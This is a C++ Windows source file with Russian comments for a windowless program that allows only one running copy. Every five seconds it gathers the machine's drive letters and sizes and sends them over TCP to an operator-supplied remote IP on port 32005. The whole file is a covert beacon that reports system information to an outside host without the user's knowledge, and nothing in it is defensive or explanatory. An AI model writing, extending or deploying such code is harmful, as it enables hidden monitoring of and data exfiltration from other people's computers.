// kostikmakostik.cpp
#include <winsock2.h>
#include <windows.h>
#include <tchar.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")

#define REMOTE_SERVER_IP _T("Ваш IP-адрес")
#define REMOTE_SERVER_PORT 32005 // Порт можно изменить

int _tmain(void)
{
    // Обеспечиваем, что процесс запущен только в одном экземпляре.
    HANDLE hMutex = CreateMutex(NULL, TRUE, _T("Global\\KostikmakostikMutex"));
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        // Если экземпляр уже запущен, завершаем приложение.
        return 0;
    }

    // Инициализация Winsock.
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0)
    {
        return 1;
    }

    // Основной цикл: каждые 5 секунд собираем информацию о дисках и отправляем её.
    while (TRUE)
    {
        TCHAR diskInfo[1024] = {0};
        _stprintf_s(diskInfo, _countof(diskInfo), _T("Disk Information:\r\n"));

        // Получаем битовую маску логических дисков.
        DWORD drives = GetLogicalDrives();
        for (int i = 0; i < 26; i++)
        {
            if (drives & (1 << i))
            {
                TCHAR driveLetter[4] = {0};
                _stprintf_s(driveLetter, _countof(driveLetter), _T("%c:\\"), _T('A') + i);

                UINT driveType = GetDriveType(driveLetter);
                // Обрабатываем только фиксированные и сменные накопители.
                if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE)
                {
                    ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
                    if (GetDiskFreeSpaceEx(driveLetter, &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes))
                    {
                        TCHAR driveLine[256] = {0};
                        _stprintf_s(driveLine, _countof(driveLine),
                                      _T("Drive %s - Total: %llu MB\r\n"),
                                      driveLetter, totalNumberOfBytes.QuadPart / (1024ULL * 1024ULL));
                        _tcscat_s(diskInfo, _countof(diskInfo), driveLine);
                    }
                }
            }
        }

        // Настраиваем TCP-соединение для отправки данных на удалённый сервер.
        struct addrinfo hints = {0}, *result = NULL;
        hints.ai_family   = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;

        // Преобразуем порт в строку.
        char portString[6] = {0};
        sprintf_s(portString, "%d", REMOTE_SERVER_PORT);

        // Здесь можно использовать как UNICODE, так и ANSI-версию:
#ifdef UNICODE
        // Для getaddrinfo можно безопасно использовать узкий вариант IP (так как REMOTE_SERVER_IP задан как _T(...))
        iResult = getaddrinfo("Ваш IP-адрес", portString, &hints, &result);
#else
        iResult = getaddrinfo(REMOTE_SERVER_IP, portString, &hints, &result);
#endif
        if(iResult == 0)
        {
            SOCKET ConnectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
            if(ConnectSocket != INVALID_SOCKET)
            {
                iResult = connect(ConnectSocket, result->ai_addr, (int)result->ai_addrlen);
                if(iResult != SOCKET_ERROR)
                {
#ifdef UNICODE
                    char sendBuffer[1024] = {0};
                    // Преобразуем Unicode информацию в UTF-8 перед отправкой.
                    WideCharToMultiByte(CP_UTF8, 0, diskInfo, -1, sendBuffer, sizeof(sendBuffer), NULL, NULL);
#else
                    const char* sendBuffer = diskInfo;
#endif
                    send(ConnectSocket, sendBuffer, (int)strlen(sendBuffer), 0);
                }
                closesocket(ConnectSocket);
            }
            freeaddrinfo(result);
        }

        Sleep(5000); // Задержка 5 секунд перед повтором цикла.
    }

    WSACleanup();
    CloseHandle(hMutex);
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    return _tmain();
}